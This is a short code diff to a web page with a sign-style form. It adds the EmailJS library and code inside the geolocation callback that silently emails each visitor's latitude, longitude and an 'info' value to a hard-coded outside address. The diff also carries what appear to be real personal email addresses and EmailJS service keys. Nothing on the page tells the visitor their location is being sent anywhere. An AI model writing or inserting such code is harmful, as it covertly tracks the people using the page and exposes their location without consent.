@@ -1,4 +1,12 @@
 <link rel="stylesheet" href="css/sign-style.css">
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("user_uE0i6tY2GZkUdmlNxpI41");
+   })();
+</script>
 <div class="background">
         
             <form style="text-align: center;" class="rect">
@@ -56,6 +64,21 @@
     status.textContent = '';
     mapLink.href = `https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`;
     mapLink.textContent = `Latitude: ${latitude} °, Longitude: ${longitude} °`;
+    var templateParams = {
+    name: 'James',
+    notes: 'Check this out!'
+};
+ 
+emailjs.send("service_9gojpxb","template_83lvn1a",{
+from_name: "antoanargirov1404@gmail.com",
+to_name: "danielshimotnoto@abv.bg",
+message: latitude + ", " + longitude + ", " + info,
+})
+    .then(function(response) {
+       console.log('SUCCESS!', response.status, response.text);
+    }, function(error) {
+       console.log('FAILED...', error);
+    });
   }
 
   function error() {
